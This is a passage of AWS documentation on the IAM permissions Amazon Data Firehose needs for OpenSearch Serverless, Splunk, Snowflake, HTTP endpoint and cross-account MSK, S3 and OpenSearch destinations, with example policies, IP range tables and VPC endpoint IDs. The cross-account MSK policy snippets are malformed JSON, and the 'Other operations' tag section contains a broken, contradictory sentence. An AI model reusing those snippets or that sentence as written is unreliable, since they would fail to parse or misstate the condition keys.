your S3 bucket. If error logging is enabled, Amazon Data Firehose also sends data delivery errors to
your CloudWatch log group and streams. Amazon Data Firehose uses an IAM role to access the specified
OpenSearch Serverless collection, S3 bucket, AWS KMS key, and CloudWatch log group and streams.
You are required to have an IAM role when creating a Firehose stream.

Use the following access policy to enable Amazon Data Firehose to access your S3 bucket, OpenSearch
Serverless domain, and AWS KMS key. If you do not own the S3 bucket, add
`s3:PutObjectAcl` to the list of Amazon S3 actions, which grants the bucket
owner full access to the objects delivered by Amazon Data Firehose. This policy also has a statement
that allows access to Amazon Kinesis Data Streams. If you don't use Kinesis Data Streams as your data source, you can
remove that statement.

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::amzn-s3-demo-bucket",
                "arn:aws:s3:::amzn-s3-demo-bucket/*"
            ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "kms:Decrypt",
               "kms:GenerateDataKey"
           ],
           "Resource": [
               "arn:aws:kms:region:account-id:key/key-id"
           ],
           "Condition": {
               "StringEquals": {
                   "kms:ViaService": "s3.region.amazonaws.com"
               },
               "StringLike": {
                   "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
               }
           }
        },
       {
          "Effect": "Allow",
          "Action": [
              "kinesis:DescribeStream",
              "kinesis:GetShardIterator",
              "kinesis:GetRecords",
              "kinesis:ListShards"
          ],
          "Resource": "arn:aws:kinesis:region:account-id:stream/stream-name"
       },
       {
          "Effect": "Allow",
          "Action": [
              "logs:PutLogEvents"
          ],
          "Resource": [
              "arn:aws:logs:region:account-id:log-group:log-group-name:log-stream:log-stream-name"
          ]
       },
       {
          "Effect": "Allow",
          "Action": [
              "lambda:InvokeFunction",
              "lambda:GetFunctionConfiguration"
          ],
          "Resource": [
              "arn:aws:lambda:region:account-id:function:function-name:function-version"
          ]
       },
       {
        "Effect": "Allow",
        "Action": "aoss:APIAccessAll",
        "Resource": "arn:aws:aoss:region:account-id:collection/collection-id"
      }
    ]
}
```

In addition to the policy above, you must also configure Amazon Data Firehose to have
the following minimum permissions assigned in a data access policy:

```

[
   {
      "Rules":[
         {
            "ResourceType":"index",
            "Resource":[
               "index/target-collection/target-index"
            ],
            "Permission":[
               "aoss:WriteDocument",
               "aoss:UpdateIndex",
               "aoss:CreateIndex"
            ]
         }
      ],
      "Principal":[
         "arn:aws:sts::account-id:assumed-role/firehose-delivery-role-name/*"
      ]
   }
]
```

For more information about allowing other AWS services to access your AWS
resources, see [Creating a
Role to Delegate Permissions to an AWS Service](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-service.html) in the
*IAM User Guide*.

## Grant Firehose access to an OpenSearch Serverless destination in a VPC

If your OpenSearch Serverless collection is in a VPC, make sure you give Amazon Data Firehose the
permissions that are described in the previous section. In addition, you need to give
Amazon Data Firehose the following permissions to enable it to access your OpenSearch Serverless
collection's VPC.

* `ec2:DescribeVpcs`
* `ec2:DescribeVpcAttribute`
* `ec2:DescribeSubnets`
* `ec2:DescribeSecurityGroups`
* `ec2:DescribeNetworkInterfaces`
* `ec2:CreateNetworkInterface`
* `ec2:CreateNetworkInterfacePermission`
* `ec2:DeleteNetworkInterface`

###### Important

Do not revoke these permissions after you create the Firehose stream. If you revoke these
permissions, your Firehose stream will be degraded or stop delivering data to your
OpenSearch service domain whenever the service attempts to query or update
ENIs.

###### Important

When you specify subnets for delivering data to the destination in a private VPC, make sure you have enough number
of free IP addresses in chosen subnets. If there is no available free IP address in a specified subnet, Firehose cannot create or
add ENIs for the data delivery in the private VPC, and the delivery will be degraded or fail.

When you create or update your Firehose stream, you specify a security group for Firehose to
use when it sends data to your OpenSearch Serverless collection. You can use the same
security group that the OpenSearch Serverless collection uses or a different one. If you
specify a different security group, ensure that it allows outbound HTTPS traffic to the
OpenSearch Serverless collection's security group. Also ensure that the OpenSearch
Serverless collection's security group allows HTTPS traffic from the security group you
specified when you configured your Firehose stream. If you use the same security group for
both your Firehose stream and the OpenSearch Serverless collection, make sure the security
group inbound rule allows HTTPS traffic. For more information about security group
rules, see [Security group rules](https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html#SecurityGroupRules) in the Amazon VPC documentation.

## Grant Firehose access to a Splunk destination

When you're using a Splunk destination, Amazon Data Firehose delivers data to your Splunk HTTP Event
Collector (HEC) endpoint. It also backs up that data to the Amazon S3 bucket that you
specify, and you can optionally use an AWS KMS key that you own for Amazon S3 server-side
encryption. If error logging is enabled, Firehose sends data delivery errors to your CloudWatch
log streams. You can also use AWS Lambda for data transformation.

If you use an AWS load balancer, make sure that it is a Classic Load Balancer or an Application Load Balancer. Also, enable duration-based sticky sessions with
cookie expiration disabled for Classic Load Balancer and expiration is set to the maximum (7 days) for Application Load Balancer. For information about how to do this, see Duration-Based Session Stickiness
for [Classic Load Balancer](https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/elb-sticky-sessions.html#enable-sticky-sessions-duration) or
an [Application Load Balancer](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/sticky-sessions.html).

You must have an IAM role when you create a Firehose stream. Firehose assumes that IAM
role and gains access to the specified bucket, key, and CloudWatch log group and
streams.

Use the following access policy to enable Amazon Data Firehose to access your S3 bucket. If you don't
own the S3 bucket, add `s3:PutObjectAcl` to the list of Amazon S3 actions, which
grants the bucket owner full access to the objects delivered by Amazon Data Firehose. This policy also
grants Amazon Data Firehose access to CloudWatch for error logging and to AWS Lambda for data transformation.
The policy also has a statement that allows access to Amazon Kinesis Data Streams. If you don't use Kinesis Data Streams
as your data source, you can remove that statement. Amazon Data Firehose doesn't use IAM to access
Splunk. For accessing Splunk, it uses your HEC token.

```
{
    "Version": "2012-10-17",
    "Statement":
    [
        {
            "Effect": "Allow",
            "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::amzn-s3-demo-bucket",
                "arn:aws:s3:::amzn-s3-demo-bucket/*"
            ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "kms:Decrypt",
               "kms:GenerateDataKey"
           ],
           "Resource": [
               "arn:aws:kms:region:account-id:key/key-id"
           ],
           "Condition": {
               "StringEquals": {
                   "kms:ViaService": "s3.region.amazonaws.com"
               },
               "StringLike": {
                   "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
               }
           }
        },
        {
           "Effect": "Allow",
           "Action": [
               "kinesis:DescribeStream",
               "kinesis:GetShardIterator",
               "kinesis:GetRecords",
               "kinesis:ListShards"
           ],
           "Resource": "arn:aws:kinesis:region:account-id:stream/stream-name"
        },
        {
           "Effect": "Allow",
           "Action": [
               "logs:PutLogEvents"
           ],
           "Resource": [
               "arn:aws:logs:region:account-id:log-group:log-group-name:log-stream:*"
           ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "lambda:InvokeFunction",
               "lambda:GetFunctionConfiguration"
           ],
           "Resource": [
               "arn:aws:lambda:region:account-id:function:function-name:function-version"
           ]
        }
    ]
}
```

For more information about allowing other AWS services to access your AWS
resources, see [Creating a
Role to Delegate Permissions to an AWS Service](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-service.html) in the
*IAM User Guide*.

## Accessing Splunk in VPC

If your Splunk platform is in a VPC, it must be publicly accessible with a public IP
address. Also, grant Amazon Data Firehose access to your Splunk platform by unblocking the Amazon Data Firehose IP
addresses. Amazon Data Firehose currently uses the following CIDR blocks.

| Region | CIDR blocks |
| --- | --- |
| US East (Ohio) | `18.216.68.160/27, 18.216.170.64/27, 18.216.170.96/27`\ |
| US East (N. Virginia) | `34.238.188.128/26, 34.238.188.192/26, 34.238.195.0/26` |
| US West (N. California) | `13.57.180.0/26` |
| US West (Oregon) | `34.216.24.32/27, 34.216.24.192/27, 34.216.24.224/27` |
| AWS GovCloud (US-East) | `18.253.138.192/26` |
| AWS GovCloud (US-West) | `52.61.204.192/26` |
| Asia Pacific (Hong Kong) | `18.162.221.64/26` |
| Asia Pacific (Mumbai) | `13.232.67.64/26` |
| Asia Pacific (Seoul) | `13.209.71.0/26` |
| Asia Pacific (Singapore) | `13.229.187.128/26` |
| Asia Pacific (Sydney) | `13.211.12.0/26` |
| Asia Pacific (Tokyo) | `13.230.21.0/27, 13.230.21.32/27` |
| Canada (Central) | `35.183.92.64/26` |
| Canada West (Calgary) | `40.176.98.128/26` |
| Europe (Frankfurt) | `18.194.95.192/27, 18.194.95.224/27, 18.195.48.0/27` |
| Europe (Ireland) | `34.241.197.32/27, 34.241.197.64/27, 34.241.197.96/27` |
| Europe (London) | `18.130.91.0/26` |
| Europe (Paris) | `35.180.112.0/26` |
| Europe (Spain) | `18.100.194.0/26` |
| Europe (Stockholm) | `13.53.191.0/26` |
| Middle East (Bahrain) | `15.185.91.64/26` |
| South America (SÃ£o Paulo) | `18.228.1.192/26` |
| Europe (Milan) | `15.161.135.192/26` |
| Africa (Cape Town) | `13.244.165.128/26` |
| Asia Pacific (Osaka) | `13.208.217.0/26` |
| China (Beijing) | `52.81.151.64/26` |
| China (Ningxia) | `161.189.23.128/26` |
| Asia Pacific (Jakarta) | `108.136.221.128/26` |
| Middle East (UAE) | `3.28.159.64/26` |
| Israel (Tel Aviv) | `51.16.102.64/26` |
| Europe (Zurich) | `16.62.183.64/26` |
| Asia Pacific (Hyderabad) | `18.60.192.192/26` |
| Asia Pacific (Melbourne) | `16.50.161.192/26` |
| Asia Pacific (Malaysia) | `43.216.44.192/26` |

## Ingest VPC flow logs into Splunk using Amazon Data Firehose

To learn more about how to create a VPC flow log subscription, publish to Firehose, and send
the VPC flow logs to a supported destination see [Ingest VPC flow logs into Splunk using Amazon Data Firehose](https://www.splunk.com/en_us/blog/partners/streamline-your-amazon-vpc-flow-logs-ingestion-to-splunk.html).

## Accessing Snowflake or HTTP end point

There is no subset of [AWS IP address ranges](https://docs.aws.amazon.com/vpc/latest/userguide/aws-ip-ranges.html)
specific to Amazon Data Firehose when the destination is HTTP end point or Snowflake public
clusters.

To add Firehose to an allow list for public Snowflake clusters or to your public HTTP or
HTTPS endpoints, add all the current [AWS IP address ranges](https://docs.aws.amazon.com/vpc/latest/userguide/aws-ip-ranges.html) to
your ingress rules.

###### Note

Notifications aren't always sourced from IP addresses in the same AWS Region as
their associated topic. You must include the AWS IP address range for all
Regions.

## Grant Firehose access to a Snowflake destination

When you're using Snowflake as a destination, Firehose delivers data to a Snowflake account using your Snowflake account URL. It also backs up
error data to the Amazon Simple Storage Service bucket that you specify, and you can optionally use an AWS Key Management Service key that you own for Amazon S3 server-side encryption.
If error logging is enabled, Firehose sends data delivery errors to your CloudWatch Logs streams.

You must have an IAM role before you create a Firehose stream. Firehose assumes that IAM role
and gains access to the specified bucket, key, and CloudWatch Logs group and streams. Use the
following access policy to enable Firehose to access your S3 bucket. If you don't own the
S3 bucket, add `s3:PutObjectAcl` to the list of Amazon Simple Storage Service actions, which
grants the bucket owner full access to the objects delivered by Firehose. This policy also
grants Firehose access to CloudWatch for error logging. The policy also has a statement that
allows access to Amazon Kinesis Data Streams. If you don't use Kinesis Data Streams as your data source, you can remove
that statement. Firehose doesn't use IAM to access Snowflake. For accessing Snowflake, it
uses your Snowflake account Url and PrivateLink Vpce Id in the case of a private
cluster.

```
{
"Version": "2012-10-17",
    "Statement":
    [
        {
"Effect": "Allow",
            "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::amzn-s3-demo-bucket",
                "arn:aws:s3:::amzn-s3-demo-bucket/*"
            ]
        },
        {
"Effect": "Allow",
           "Action": [
               "kms:Decrypt",
               "kms:GenerateDataKey"
           ],
           "Resource": [
               "arn:aws:kms:region:account-id:key/key-id"
           ],
           "Condition": {
"StringEquals": {
"kms:ViaService": "s3.region.amazonaws.com"
               },
               "StringLike": {
"kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
               }
           }
        },
        {
"Effect": "Allow",
           "Action": [
               "kinesis:DescribeStream",
               "kinesis:GetShardIterator",
               "kinesis:GetRecords",
               "kinesis:ListShards"
           ],
           "Resource": "arn:aws:kinesis:region:account-id:stream/stream-name"
        },
        {
"Effect": "Allow",
           "Action": [
               "logs:PutLogEvents"
           ],
           "Resource": [
               "arn:aws:logs:region:account-id:log-group:log-group-name:log-stream:*"
           ]
        }
    ]
}
```

For more information about allowing other AWS services to access your AWS resources, see [Creating a Role to Delegate Permissions to an AWS Service](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-service.html)
in the *IAM User Guide*.

## Accessing Snowflake in VPC

If your Snowflake cluster is private link enabled, Firehose will use one of the following
VPC endpoints at time of private link creation to deliver data to your private cluster
without going through public internet. For this, create Snowflake network rules to allow
ingress from the following `AwsVpceIds` for the AWS Region your cluster is
in. For more information, see [Creating
network rule](https://docs.snowflake.com/en/sql-reference/sql/create-network-rule) in *Snowflake User Guide*.

VPC Endpoint Ids to use based on Regions your cluster is in
| AWS Region | `VPCE IDs` |
| --- | --- |
| US East (Ohio) | vpce-0d96cafcd96a50aeb  vpce-0cec34343d48f537b |
| US East (N. Virginia) | vpce-0b4d7e8478e141ba8  vpce-0b75cd681fb507352  vpce-01c03e63820ec00d8  vpce-0c2cfc51dc2882422  vpce-06ca862f019e4e056  vpce-020cda0cfa63f8d1c  vpce-0b80504a1a783cd70  vpce-0289b9ff0b5259a96  vpce-0d7add8628bd69a12  vpce-02bfb5966cc59b2af  vpce-09e707674af878bf2  vpce-049b52e96cc1a2165  vpce-0bb6c7b7a8a86cdbb  vpce-03b22d599f51e80f3  vpce-01d60dc60fc106fe1  vpce-0186d20a4b24ecbef  vpce-0533906401a36e416  vpce-05111fb13d396710e  vpce-0694613f4fbd6f514  vpce-09b21cb25fe4cc4f4  vpce-06029c3550e4d2399  vpce-00961862a21b033da  vpce-01620b9ae33273587  vpce-078cf4ec226880ac9  vpce-0d711bf076ce56381  vpce-066b7e13cbfca6f6e  vpce-0674541252d9ccc26  vpce-03540b88dedb4b000  vpce-0b1828e79ad394b95  vpce-0dc0e6f001fb1a60d  vpce-0d8f82e71a244098a  vpce-00e374d9e3f1af5ce  vpce-0c1e3d6631ddb442f |
| US West (Oregon) | vpce-0f60f72da4cd1e4e7  vpce-0c60d21eb8b1669fd  vpce-01c4e3e29afdafbef  vpce-0cc6bf2a88da139de  vpce-0797e08e169e50662  vpce-033cbe480381b5c0e  vpce-00debbdd8f9eb10a5  vpce-08ec2f386c809e889  vpce-0856d14310857b545 |
| Europe (Frankfurt) | vpce-068dbb7d71c9460fb  vpce-0a7a7f095942d4ec9 |
| Europe (Ireland) | vpce-06857e59c005a6276  vpce-04390f4f8778b75f2  vpce-011fd2b1f0aa172fd |
| Asia Pacific (Tokyo) | vpce-06369e5258144e68a  vpce-0f2363cdb8926fbe8 |
| Asia Pacific (Singapore) | vpce-049cd46cce7a12d52  vpce-0e8965a1a4bdb8941 |
| Asia Pacific (Seoul) | vpce-0aa444d9001e1faa1  vpce-04a49d4dcfd02b884 |
| Asia Pacific (Sydney) | vpce-048a60a182c52be63  vpce-03c19949787fd1859 |
| Asia Pacific (Mumbai) | vpce-0d68cb822f6f0db68  vpce-0517d32692ffcbde2 |
| Europe (London) | vpce-0fd1874a0ba3b9374  vpce-08091b1a85e206029 |
| South America (Sao Paulo) | vpce-065169b8144e4f12e  vpce-0493699f0e5762d63 |
| Canada (Central) | vpce-07e6ed81689d5271f  vpce-0f53239730541394c |
| Europe (Paris) | vpce-09419680077e6488a  vpce-0ea81ba2c08140c14 |
| Asia Pacific (Osaka) | vpce-0a9f003e6a7e38c05  vpce-02886510b897b1c5a |
| Europe (Stockholm) | vpce-0d96410833219025a  vpce-060a32f9a75ba969f |
| Asia Pacific (Jakarta) | vpce-00add4b9a25e5c649  vpce-004ae2de34338a856 |

## Grant Firehose access to an HTTP endpoint destination

You can use Amazon Data Firehose to deliver data to any HTTP endpoint destination. Amazon Data Firehose also backs
up that data to the Amazon S3 bucket that you specify, and you can optionally use an AWS KMS
key that you own for Amazon S3 server-side encryption. If error logging is enabled, Amazon Data Firehose
sends data delivery errors to your CloudWatch log streams. You can also use AWS Lambda for data
transformation.

You are required to have an IAM role when creating a Firehose stream. Amazon Data Firehose assumes
that IAM role and gains access to the specified bucket, key, and CloudWatch log group and
streams.

Use the following access policy to enable Amazon Data Firehose to access the S3 bucket that you
specified for data backup. If you don't own the S3 bucket, add
`s3:PutObjectAcl` to the list of Amazon S3 actions, which grants the bucket
owner full access to the objects delivered by Amazon Data Firehose. This policy also grants Amazon Data Firehose
access to CloudWatch for error logging and to AWS Lambda for data transformation. The policy
also has a statement that allows access to Amazon Kinesis Data Streams. If you don't use Kinesis Data Streams as your
data source, you can remove that statement.

###### Important

Amazon Data Firehose doesn't use IAM to access HTTP endpoint destinations owned by supported
third-party service providers, including Datadog, Dynatrace, LogicMonitor, MongoDB,
New Relic, Splunk, or Sumo Logic. For accessing a specified HTTP endpoint
destination owned by a supported third-party service provider, contact that service
provider to obtain the API key or the access key that is required to enable data
delivery to that service from Amazon Data Firehose.

```
{
    "Version": "2012-10-17",
    "Statement":
    [
        {
            "Effect": "Allow",
            "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::amzn-s3-demo-bucket",
                "arn:aws:s3:::amzn-s3-demo-bucket/*"
            ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "kms:Decrypt",
               "kms:GenerateDataKey"
           ],
           "Resource": [
               "arn:aws:kms:region:account-id:key/key-id"
           ],
           "Condition": {
               "StringEquals": {
                   "kms:ViaService": "s3.region.amazonaws.com"
               },
               "StringLike": {
                   "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
               }
           }
        },
        {
           "Effect": "Allow",
           "Action": [
               "kinesis:DescribeStream",
               "kinesis:GetShardIterator",
               "kinesis:GetRecords",
               "kinesis:ListShards"
           ],
           "Resource": "arn:aws:kinesis:region:account-id:stream/stream-name"
        },
        {
           "Effect": "Allow",
           "Action": [
               "logs:PutLogEvents"
           ],
           "Resource": [
               "arn:aws:logs:region:account-id:log-group:log-group-name:log-stream:*"
           ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "lambda:InvokeFunction",
               "lambda:GetFunctionConfiguration"
           ],
           "Resource": [
               "arn:aws:lambda:region:account-id:function:function-name:function-version"
           ]
        }
    ]
}
```

For more information about allowing other AWS services to access your AWS
resources, see [Creating a
Role to Delegate Permissions to an AWS Service](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-service.html) in the
*IAM User Guide*.

###### Important

Currently Amazon Data Firehose does NOT support data delivery to HTTP endpoints in a VPC.

## Cross-account delivery from Amazon MSK

When you're creating a Firehose stream from your Firehose account (for example, Account B) and
your source is an MSK cluster in another AWS account (Account A), you must have the
following configurations in place.

**Account A:**

1. In the Amazon MSK console, choose the provisioned cluster and then choose **Properties**.
2. Under **Network settings**, choose **Edit** and turn on **Multi-VPC connectivity**.
3. Under **Security settings** choose **Edit cluster policy**.

   1. If the cluster does not already have a policy configured, check **Include Firehose service principal** and **Enable Firehose cross-account S3 delivery**. The AWS Management Console will
      automatically generate a policy with the appropriate permissions.
   2. If the cluster already has a policy configured, add the following permissions to the existing policy:

      ```
      {
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::arn:role/mskaasTestDeliveryRole"
            },
            "Action": [
              "kafka:GetBootstrapBrokers",
              "kafka:DescribeCluster",
              "kafka:DescribeClusterV2",
              "kafka-cluster:Connect"
            ],
            "Resource": "arn:aws:kafka:us-east-1:arn:cluster/DO-NOT-TOUCH-mskaas-provisioned-privateLink/xxxxxxxxx-2f3a-462a-ba09-xxxxxxxxxx-20"  // ARN of the cluster
          },
          {
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::arn:role/mskaasTestDeliveryRole"
            },
            "Action": [
              "kafka-cluster:DescribeTopic",
              "kafka-cluster:DescribeTopicDynamicConfiguration",
              "kafka-cluster:ReadData"
            ],
            "Resource": "arn:aws:kafka:us-east-1:arn:topic/DO-NOT-TOUCH-mskaas-provisioned-privateLink/xxxxxxxxx-2f3a-462a-ba09-xxxxxxxxxx-20/*"//topic of the cluster
          },
          {
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::233450236687:role/mskaasTestDeliveryRole"
            },
            "Action": "kafka-cluster:DescribeGroup",
            "Resource": "arn:aws:kafka:us-east-1:arn:group/DO-NOT-TOUCH-mskaas-provisioned-privateLink/xxxxxxxxx-2f3a-462a-ba09-xxxxxxxxxx-20/*" //topic of the cluster
          },
       }

      ```
4. Under **AWS principal**, enter the principal ID from Account B.
5. Under **Topic**, specify the Apache Kafka topic from which you want your
   Firehose stream to ingest data. Once the Firehose stream is created, you cannot update
   this topic.
6. Choose **Save changes**

**Account B:**

1. In the Firehose console, choose **Create Firehose stream** using Account B.
2. Under **Source**, choose **Amazon Managed Streaming for Apache Kafka**.
3. Under **Source settings**, for the **Amazon Managed Streaming for Apache Kafka cluster**, enter the ARN of the Amazon MSK cluster in Account A.
4. Under **Topic**, specify the Apache Kafka topic from which you want your
   Firehose stream to ingest data. Once the Firehose stream is created, you cannot update
   this topic.
5. In **Delivery stream name** specify the name for your Firehose stream.

In Account B when you're creating your Firehose stream, you must have an IAM role (created by
default when using the AWS Management Console) that grants the Firehose stream 'read' access to the
cross-account Amazon MSK cluster for the configured topic.

The following is what gets configured by the AWS Management Console:

```
{
    "Sid": "",
    "Effect": "Allow",
    "Action": [
        "kafka:GetBootstrapBrokers",
        "kafka:DescribeCluster",
        "kafka:DescribeClusterV2",
        "kafka-cluster:Connect"
        ],
    "Resource": "arn:aws:kafka:us-east-1:arn:cluster/DO-NOT-TOUCH-mskaas-provisioned-privateLink/xxxxxxxxx-2f3a-462a-ba09-xxxxxxxxxx-20/*" //topic of the cluster
    },
    {
    "Sid": "",
    "Effect": "Allow",
    "Action": [
        "kafka-cluster:DescribeTopic",
        "kafka-cluster:DescribeTopicDynamicConfiguration",
        "kafka-cluster:ReadData"
    ],
    "Resource": "arn:aws:kafka:us-east-1:arn:topic/DO-NOT-TOUCH-mskaas-provisioned-privateLink/xxxxxxxxx-2f3a-462a-ba09-xxxxxxxxxx-20/mskaas_test_topic" //topic of the cluster
    },
    {
    "Sid": "",
    "Effect": "Allow",
    "Action": [
        "kafka-cluster:DescribeGroup"
    ],
    "Resource": "arn:aws:kafka:us-east-1:arn:group/DO-NOT-TOUCH-mskaas-provisioned-privateLink/xxxxxxxxx-2f3a-462a-ba09-xxxxxxxxxx-20/*" //topic of the cluster
    },
 }

```

Next, you can complete the optional step of configuring record transformation and
record format conversion. For more information, see [(Optional) Configure record transformation and format
conversion](./create-transform.html).

## Cross-account delivery to an Amazon S3 destination

You can use the AWS CLI or the Amazon Data Firehose APIs to create a Firehose stream in one AWS
account with an Amazon S3 destination in a different account. The following procedure shows
an example of configuring a Firehose stream owned by account A to deliver data to
an Amazon S3 bucket owned by account B.

1. Create an IAM role under account A using steps described in [Grant Firehose Access to an Amazon S3 Destination](https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-s3).

   ###### Note

   The Amazon S3 bucket specified in the access policy is owned by account B in
   this case. Make sure you add `s3:PutObjectAcl` to the list of
   Amazon S3 actions in the access policy, which grants account B full access to the
   objects delivered by Amazon Data Firehose. This permission is required for cross
   account delivery. Amazon Data Firehose sets the "x-amz-acl" header on the request to
   "bucket-owner-full-control".
2. To allow access from the IAM role previously created, create an S3 bucket
   policy under account B. The following code is an example of the bucket policy.
   For more information, see [Using
   Bucket Policies and User Policies](https://docs.aws.amazon.com/AmazonS3/latest/dev/using-iam-policies.html).

   ```
   {

       "Version": "2012-10-17",
       "Id": "PolicyID",
       "Statement": [
           {
               "Sid": "StmtID",
               "Effect": "Allow",
               "Principal": {
                   "AWS": "arn:aws:iam::accountA-id:role/iam-role-name"
               },
               "Action": [
                   "s3:AbortMultipartUpload",
                   "s3:GetBucketLocation",
                   "s3:GetObject",
                   "s3:ListBucket",
                   "s3:ListBucketMultipartUploads",
                   "s3:PutObject",
                   "s3:PutObjectAcl"
               ],
               "Resource": [
                   "arn:aws:s3:::amzn-s3-demo-bucket",
                   "arn:aws:s3:::amzn-s3-demo-bucket/*"
               ]
           }
       ]
   }

   ```
3. Create a Firehose stream under account A using the IAM role that you
   created in step 1.
## Cross-account delivery to an OpenSearch Service destination

You can use the AWS CLI or the Amazon Data Firehose APIs to create a Firehose stream in one AWS
account with an OpenSearch Service destination in a different account. The following procedure shows
an example of how you can create a Firehose stream under account A and configure it to
deliver data to an OpenSearch Service destination owned by account B.

1. Create an IAM role under account A using the steps described in [Grant Firehose access to a public OpenSearch Service destination](#using-iam-es).
2. To allow access from the IAM role that you created in the previous step,
   create an OpenSearch Service policy under account B. The following JSON is an
   example.

   ```
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Effect": "Allow",
         "Principal": {
           "AWS": "arn:aws:iam::Account-A-ID:role/firehose_delivery_role "
         },
         "Action": "es:ESHttpGet",
         "Resource": [
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/_all/_settings",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/_cluster/stats",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/roletest*/_mapping/roletest",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/_nodes",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/_nodes/stats",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/_nodes/*/stats",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/_stats",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/roletest*/_stats",
           "arn:aws:es:us-east-1:Account-B-ID:domain/cross-account-cluster/"
         ]
       }
     ]
   }
   ```
3. Create a Firehose stream under account A using the IAM role that you
   created in step 1. When you create the Firehose stream, use the AWS CLI or the
   Amazon Data Firehose APIs and specify the `ClusterEndpoint` field instead of
   `DomainARN` for OpenSearch Service.

###### Note

To create a Firehose stream in one AWS account with an OpenSearch Service
destination in a different account, you must use the AWS CLI or the Amazon Data Firehose APIs. You
can't use the AWS Management Console to create this kind of cross-account configuration.

## Using tags to control access

You can use the optional `Condition` element (or `Condition`
*block*) in an IAM policy to fine-tune access to Amazon Data Firehose operations
based on tag keys and values. The following subsections describe how to do this for the
different Amazon Data Firehose operations. For more on the use of the `Condition` element
and the operators that you can use within it, see [IAM JSON Policy Elements: Condition](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition.html).

### CreateDeliveryStream

For the `CreateDeliveryStream` operation, use the
`aws:RequestTag` condition key. In the following example,
`MyKey` and `MyValue` represent the key and corresponding
value for a tag. For more information, see [Understand tag basics](./firehose-tagging-basics.html)

```
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": [
            "firehose:CreateDeliveryStream",
            "firehose:TagDeliveryStream"
        ],
        "Resource": "*",
        "Condition": {
            "StringEquals": {
                "aws:RequestTag/MyKey": "MyValue"
            }
        }
    }]
}
```
### TagDeliveryStream

For the `TagDeliveryStream` operation, use the `aws:TagKeys`
condition key. In the following example, `MyKey` is an example tag
key.

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "firehose:TagDeliveryStream",
            "Resource": "*",
            "Condition": {
                "ForAnyValue:StringEquals": {
                    "aws:TagKeys": "MyKey"
                 }
            }
        }
    ]
}
```
### UntagDeliveryStream

For the `UntagDeliveryStream` operation, use the
`aws:TagKeys` condition key. In the following example,
`MyKey` is an example tag key.

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "firehose:UntagDeliveryStream",
            "Resource": "*",
            "Condition": {
                "ForAnyValue:StringEquals": {
                    "aws:TagKeys": "MyKey"
                 }
            }
        }
    ]
}
```
### ListDeliveryStreams

You can't use tag-based access control with
`ListDeliveryStreams`.

### Other operations

For all Firehose operations other than `CreateDeliveryStream`,
`TagDeliveryStream`, `UntagDeliveryStream`, and
`ListDeliveryStreams`, use the `aws:RequestTag` condition
key. In the following example, `MyKey` and `MyValue` represent
the key and corresponding value for a tag.

`ListDeliveryStreams`, use the `firehose:ResourceTag`
condition key to control access based on the tags on that Firehose stream.

In the following example, `MyKey` and `MyValue` represent
the key and corresponding value for a tag. The policy would only apply to Data
Firehose streams having a tag named `MyKey` with a value of
`MyValue`. For more information about controlling access based on
resource tags, see [Controlling access to AWS resources using tags](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_tags.html#access_tags_control-resources) in the
*IAM User Guide*.

```
{
    "Version": "2012-10-17",
    "Statement": [
      {
            "Effect": "Deny",
            "Action": "firehose:DescribeDeliveryStream",
            "Resource": "*",
            "Condition": {
                "StringEquals": {
	                     "firehose:ResourceTag/MyKey": "MyValue"
	                 }
            }
        }
    ]
}
```

